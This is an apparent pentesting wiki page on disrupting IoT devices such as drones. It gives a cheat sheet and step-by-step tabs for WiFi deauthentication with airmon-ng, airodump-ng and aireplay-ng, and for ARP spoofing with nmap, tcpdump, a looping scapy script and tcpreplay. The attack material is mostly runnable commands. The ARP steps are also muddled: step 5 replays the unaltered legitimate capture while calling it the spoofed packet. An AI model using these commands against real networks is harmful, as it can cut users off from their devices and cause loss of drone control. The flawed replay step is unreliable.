# Deauthentication Attacks

## Theory

IoT devices are often either connected to a WiFi network or even host their own network for user to intact with it. A stable WiFi connection can be critical to some IoT devices.For example deauthentication is probably one of the most concerning things a drone pilot can experience, since when his controller is deauthenticated he is unable to control the drone appropriate.&#x20;

## Cheat Sheet

Using aireplay-ng

```bash
# Put the wireless interface in monitor mode
airmon-ng start wlan0  

# Scan for networks to identify target AP and clients
airodump-ng wlan0mon  

# (Optional) Focus scan on a specific channel to reduce noise
airodump-ng -c <channel> wlan0mon  

# Perform deauthentication attack on a specific client
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon  

# Deauthenticate all clients from the AP
aireplay-ng --deauth 10 -a <AP_BSSID> wlan0mon  

# Stop monitor mode on the wireless interface
airmon-ng stop wlan0mon  
```

ARP-Spoofing:

```bash
# 1. Join the Target Network
# Connect to the target network (no command, but ensure you're connected to the same network as the target device).

# 2. Identify the Target Device and Controller
nmap -sn <network_address_range>  # Scans the network to identify devices (replace with network range, e.g., 192.168.1.0/24)

# 3. Capture a Legitimate ARP Response
tcpdump -i <interface> arp -w arp_capture.pcap  # Captures ARP packets to a file (replace <interface> with your network interface)

# 4. Modify the ARP Response with a Spoofed MAC Address
# Use a tool like `scapy` in Python to craft a spoofed ARP packet:
from scapy.all import ARP, send
packet = ARP(op=2, psrc="<controller_IP>", hwsrc="<attacker_MAC>", pdst="<target_IP>")
send(packet, loop=1, inter=0.5)

# 5. Replay the Spoofed ARP Packet to the Target Device
tcpreplay --intf1=<interface> -l 0 arp_capture.pcap  # Sends the modified ARP packet to the network continuously (replace <interface>)

# 6. Monitor the Connection Status
# Observe the target device or controller for any indication of disconnection (e.g., disconnected light or notification).

# 7. Stop the Attack
# Stop sending packets by terminating the `tcpreplay` or ARP spoofing script (press Ctrl+C to end the process).
```

## Usage

{% tabs %}
{% tab title="aireplay-ng" %}
#### 1. **Put the Wireless Interface in Monitor Mode**

First, place your wireless network interface card in monitor mode. Replace `wlan0` (should be shown in `ifconfig`) with your interface name.

```bash
airmon-ng start wlan0
```

This will enable monitor mode on `wlan0` and may rename it to something like `wlan0mon`.

#### 2. **Identify Target Access Point and Clients**

Next, use `airodump-ng` to find the BSSID (MAC address) of the access point (AP) and the client(s) connected to it.

```bash
airodump-ng wlan0mon
```

Take note of the BSSID of the target AP and the channel it is operating on.

#### 3. **Deauthenticate Target Client**

Use the `aireplay-ng` command to send deauthentication packets. Replace `wlan0mon` with your monitor interface, `AP_BSSID` with the BSSID of the access point, and `CLIENT_MAC` with the MAC address of the target client.

*   **Deauthenticate a specific client from an AP:**

    ```bash
    aireplay-ng --deauth 10 -a AP_BSSID -c CLIENT_MAC wlan0mon
    ```

    Here, `10` is the number of deauth packets to send (you can increase or decrease this as needed).
*   **Deauthenticate all clients from an AP:**

    ```bash
    aireplay-ng --deauth 10 -a AP_BSSID wlan0mon
    ```
{% endtab %}

{% tab title="ARP-Spoofing" %}
#### 1. Join the Target Network

Connect to the target network you want to perform the attack on, as ARP spoofing requires the attacker to be within the same network.

#### 2. Identify Target Device and Controller

Use a network scanning tool like `nmap` to identify the IP and MAC addresses of the device (e.g., a drone) and the controller.

```bash
nmap -sn <network_address_range>
```

Replace `<network_address_range>` with the IP range (e.g., `192.168.1.0/24`). Note the IP and MAC addresses of both the target device and the controller.

#### 3. Capture a Legitimate ARP Response

Use `tcpdump` to capture ARP responses in the network. Look for packets showing the controller’s IP and MAC association.

```bash
tcpdump -i <interface> arp -w arp_capture.pcap
```

Replace `<interface>` with your network interface. This will save the ARP traffic to a file called `arp_capture.pcap`.

#### 4. Modify the ARP Response with a Spoofed MAC Address

Using `scapy` in Python, craft a spoofed ARP packet to mislead the target device into associating the controller's IP with the attacker's MAC.

```python
from scapy.all import ARP, send

packet = ARP(op=2, psrc="<controller_IP>", hwsrc="<attacker_MAC>", pdst="<target_IP>")
send(packet, loop=1, inter=0.5)
```

Replace `<controller_IP>` with the controller’s IP, `<attacker_MAC>` with your MAC address, and `<target_IP>` with the target device’s IP.

#### 5. Replay the Spoofed ARP Packet to the Target Device

Send the modified ARP packet to the target device continuously to maintain the spoofed association.

```bash
tcpreplay --intf1=<interface> -l 0 arp_capture.pcap
```

Replace `<interface>` with your network interface. This command replays the spoofed ARP response in a loop.

#### 6. Monitor the Connection Status

Observe the target device or the controller to confirm the deauthentication. The controller should eventually show a "disconnected" status when it no longer receives responses.

#### 7. Stop the Attack

To end the attack, stop sending spoofed ARP packets by terminating the replay or spoofing process (press `Ctrl+C` if running in a terminal). The target device should revert to the correct MAC association upon receiving a legitimate ARP response from the controller.
{% endtab %}
{% endtabs %}

## Resources

* [Pentesting Wifi - Deauthentication Packets](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html)
* [Wi-Fi deauthentication attack](https://en.wikipedia.org/wiki/Wi-Fi\_deauthentication\_attack)
